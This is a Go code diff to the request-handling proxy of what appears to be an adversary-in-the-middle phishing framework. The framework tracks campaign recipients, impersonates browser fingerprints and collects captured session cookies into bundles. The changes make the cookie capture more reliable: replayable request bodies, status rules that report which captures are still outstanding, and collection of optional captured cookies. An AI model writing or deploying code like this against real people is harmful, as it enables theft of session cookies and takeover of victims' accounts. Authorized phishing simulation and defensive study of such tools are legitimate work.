@@ -251,7 +251,6 @@ func (m *ProxyHandler) HandleHTTPRequest(w http.ResponseWriter, req *http.Reques
 	// prepare request for target server
 	m.prepareRequestForTarget(modifiedReq, client, reqCtx.UsedImpersonation)
 
-	// execute request</parameter>
 	// execute request
 	targetResp, err := client.Do(modifiedReq)
 	if err != nil {
@@ -735,12 +734,56 @@ func (m *ProxyHandler) patchRequestBodyWithContext(req *http.Request, reqCtx *Re
 	req.ContentLength = int64(len(body))
 }
 
+// setReplayableBody buffers the outbound request body and sets GetBody so the
+// client transport can resend it. Without GetBody a failed HTTP/2 handshake
+// cannot fall back to HTTP/1.1 for a request that carries a body. An empty body
+// is set to http.NoBody so the fallback guard treats it as bodyless.
+func (m *ProxyHandler) setReplayableBody(req *http.Request) {
+	var body []byte
+	if req.Body != nil {
+		b, err := io.ReadAll(req.Body)
+		if err != nil {
+			m.logger.Errorw("failed to read request body for replay", "error", err)
+			return
+		}
+		req.Body.Close()
+		body = b
+	}
+
+	if len(body) == 0 {
+		req.Body = http.NoBody
+		req.ContentLength = 0
+		req.GetBody = func() (io.ReadCloser, error) { return http.NoBody, nil }
+		return
+	}
+
+	req.Body = io.NopCloser(bytes.NewReader(body))
+	req.ContentLength = int64(len(body))
+	req.GetBody = func() (io.ReadCloser, error) {
+		return io.NopCloser(bytes.NewReader(body)), nil
+	}
+}
+
 func (m *ProxyHandler) prepareRequestForTarget(req *http.Request, client *http.Client, usedImpersonation bool) {
 	req.RequestURI = ""
-	// we always use surf now, which handles decompression automatically
-	// keep accept-encoding headers for browser fingerprinting
+	// keep accept-encoding headers for browser fingerprinting. surf's own
+	// response decompression is disabled (see createSurfClient) because it
+	// decodes eagerly and errors on empty-body encoded responses like 302s;
+	// readAndDecompressBody handles decompression instead.
 	// note: usedImpersonation tracks if impersonation features are enabled, not if surf is used
 	req.Header.Del(HEADER_JA4)
+
+	// remove the Content-Length header so the client transport sets the length
+	// once from req.ContentLength, which the request pipeline already derived
+	// from the buffered body. with impersonation the transport writes request
+	// headers as given and also frames the body length itself, so a leftover
+	// header sends the length twice and produces a malformed request.
+	req.Header.Del("Content-Length")
+
+	// finalize the outbound body so the transport can replay it. GetBody lets
+	// surf fall back from HTTP/2 to HTTP/1.1 when h2 negotiation fails. an empty
+	// body becomes http.NoBody so the fallback path is not blocked at all.
+	m.setReplayableBody(req)
 
 	// setup cookie jar for redirect handling
 	jar, _ := cookiejar.New(nil)
@@ -808,6 +851,9 @@ func (m *ProxyHandler) captureResponseDataWithContext(resp *http.Response, reqCt
 	// capture cookies, headers, and body
 	m.onResponseCookies(resp, reqCtx.Session)
 	m.onResponseHeader(resp, reqCtx.Session)
+	// status rules report session state and read no body, so they run for any
+	// response regardless of content type, unlike the body capture below
+	m.onResponseStatus(resp, reqCtx.Session)
 
 	contentType := resp.Header.Get("Content-Type")
 	if m.shouldProcessContent(contentType) {
@@ -1511,6 +1557,10 @@ func (m *ProxyHandler) initializeRequiredCaptures(session *service.ProxySession)
 			return true
 		}
 		for _, capture := range hCfg.Capture {
+			// status rules are operator diagnostics, never a capture the flow waits on
+			if capture.Engine == "status" {
+				continue
+			}
 			if capture.Required == nil || *capture.Required {
 				session.RequiredCaptures.Store(capture.Name, false)
 			}
@@ -1595,6 +1645,61 @@ func (m *ProxyHandler) onResponseBody(resp *http.Response, body []byte, session 
 	}
 }
 
+// onResponseStatus evaluates status rules against a response. It runs for every
+// response regardless of content type because it reads only session state, never
+// the body. When a status rule path matches it reports the outstanding required
+// captures. It never captures data or advances the flow.
+func (m *ProxyHandler) onResponseStatus(resp *http.Response, session *service.ProxySession) {
+	hostConfig, exists := m.getHostConfig(session, resp.Request.Host)
+	if !exists {
+		return
+	}
+	for _, capture := range hostConfig.Capture {
+		if capture.Engine != "status" {
+			continue
+		}
+		methodMatches := capture.Method == "" || capture.Method == resp.Request.Method
+		if methodMatches && m.matchesPath(capture, resp.Request) {
+			m.reportCaptureStatus(capture, session, resp.Request)
+		}
+	}
+}
+
+// reportCaptureStatus emits an operator info event listing the required capture
+// rules that have not fired yet for this session. It is diagnostic only: it never
+// stores captured data, marks completion, submits a cookie bundle or triggers a
+// redirect, so it cannot advance or complete the campaign flow. It fires at most
+// once per status rule per session.
+func (m *ProxyHandler) reportCaptureStatus(capture service.ProxyServiceCaptureRule, session *service.ProxySession, req *http.Request) {
+	if session.CampaignRecipientID == nil || session.CampaignID == nil {
+		return
+	}
+	// fire once per status rule per session so page reloads do not repeat the event
+	if _, already := session.StatusReported.LoadOrStore(capture.Name, true); already {
+		return
+	}
+
+	outstanding := []string{}
+	session.RequiredCaptures.Range(func(key, value interface{}) bool {
+		fired, _ := value.(bool)
+		name, ok := key.(string)
+		if ok && !fired {
+			outstanding = append(outstanding, name)
+		}
+		return true
+	})
+	sort.Strings(outstanding)
+
+	eventData := map[string]interface{}{
+		capture.Name: map[string]interface{}{
+			"capture_type": "status",
+			"outstanding":  outstanding,
+			"complete":     len(outstanding) == 0,
+		},
+	}
+	m.createCampaignInfoEvent(session, eventData, req, session.UserAgent)
+}
+
 func (m *ProxyHandler) onResponseCookies(resp *http.Response, session *service.ProxySession) {
 	hostConfig, exists := m.getHostConfig(session, resp.Request.Host)
 	if !exists {
@@ -1663,6 +1768,11 @@ func (m *ProxyHandler) shouldApplyCaptureRule(capture service.ProxyServiceCaptur
 		return false
 	}
 
+	// status is a diagnostic rule, it captures nothing and is handled in onResponseBody
+	if capture.Engine == "status" {
+		return false
+	}
+
 	// check capture source
 	if capture.From != "" && capture.From != captureType && capture.From != "any" {
 		return false
@@ -1680,6 +1790,11 @@ func (m *ProxyHandler) shouldApplyCaptureRule(capture service.ProxyServiceCaptur
 func (m *ProxyHandler) shouldProcessResponseBodyCapture(capture service.ProxyServiceCaptureRule, req *http.Request) bool {
 	// engine: cookie is owned by onResponseCookies, not the response body pipeline
 	if capture.Engine == "cookie" {
+		return false
+	}
+
+	// status rules are handled by their own branch in onResponseBody
+	if capture.Engine == "status" {
 		return false
 	}
 
@@ -2370,19 +2485,26 @@ func (m *ProxyHandler) collectCookieCaptures(session *service.ProxySession) (map
 	cookieCaptures := make(map[string]map[string]string)
 	requiredCookieCaptures := make(map[string]bool)
 
-	session.RequiredCaptures.Range(func(requiredCaptureKey, requiredCaptureValue interface{}) bool {
-		requiredCaptureName := requiredCaptureKey.(string)
-		isComplete := requiredCaptureValue.(bool)
-
-		// a required capture may be a cookie capture on any configured host, so
-		// scan every host config rather than only the start host
-		if !m.isCookieCaptureName(session, requiredCaptureName) {
+	// enumerate every cookie capture across all hosts, whether required or
+	// optional, so an optional cookie is still recorded once it was captured.
+	// required ones are tracked separately so the bundle still waits for them.
+	session.Config.Range(func(_, hostConfigValue interface{}) bool {
+		hCfg, ok := hostConfigValue.(service.ProxyServiceDomainConfig)
+		if !ok {
 			return true
 		}
-		requiredCookieCaptures[requiredCaptureName] = isComplete
-		if capturedDataInterface, exists := session.CapturedData.Load(requiredCaptureName); exists {
-			capturedData := capturedDataInterface.(map[string]string)
-			cookieCaptures[requiredCaptureName] = capturedData
+		for _, capture := range hCfg.Capture {
+			if capture.Engine != "cookie" && capture.From != "cookie" {
+				continue
+			}
+			if capturedDataInterface, exists := session.CapturedData.Load(capture.Name); exists {
+				if capturedData, ok := capturedDataInterface.(map[string]string); ok {
+					cookieCaptures[capture.Name] = capturedData
+				}
+			}
+			if requiredValue, isRequired := session.RequiredCaptures.Load(capture.Name); isRequired {
+				requiredCookieCaptures[capture.Name] = requiredValue.(bool)
+			}
 		}
 		return true
 	})
@@ -2390,29 +2512,12 @@ func (m *ProxyHandler) collectCookieCaptures(session *service.ProxySession) (map
 	return cookieCaptures, requiredCookieCaptures
 }
 
-// isCookieCaptureName reports whether the named required capture is a cookie
-// capture on any host in the session config.
-func (m *ProxyHandler) isCookieCaptureName(session *service.ProxySession, name string) bool {
-	found := false
-	session.Config.Range(func(_, hostConfigValue interface{}) bool {
-		hCfg, ok := hostConfigValue.(service.ProxyServiceDomainConfig)
-		if !ok {
-			return true
-		}
-		for _, capture := range hCfg.Capture {
-			if capture.Name == name && (capture.Engine == "cookie" || capture.From == "cookie") {
-				found = true
-				return false
-			}
-		}
-		return true
-	})
-	return found
-}
-
 func (m *ProxyHandler) areAllCookieCapturesComplete(requiredCookieCaptures map[string]bool) bool {
+	// no required cookie captures means there is nothing to wait for, so a
+	// bundle of optional cookies is allowed to ship once the outer required
+	// capture gate has already passed.
 	if len(requiredCookieCaptures) == 0 {
-		return false
+		return true
 	}
 
 	for _, isComplete := range requiredCookieCaptures {
@@ -3192,12 +3297,6 @@ func (m *ProxyHandler) normalizeRequestHeaders(req *http.Request, session *servi
 
 	if secFetchDest := req.Header.Get("Sec-Fetch-Dest"); secFetchDest == "iframe" {
 		req.Header.Set("Sec-Fetch-Dest", "document")
-	}
-
-	if req.Body != nil && (req.Method == "POST" || req.Method == "PUT" || req.Method == "PATCH") {
-		if req.Header.Get("Content-Length") == "" && req.ContentLength > 0 {
-			req.Header.Set("Content-Length", fmt.Sprintf("%d", req.ContentLength))
-		}
 	}
 }
 
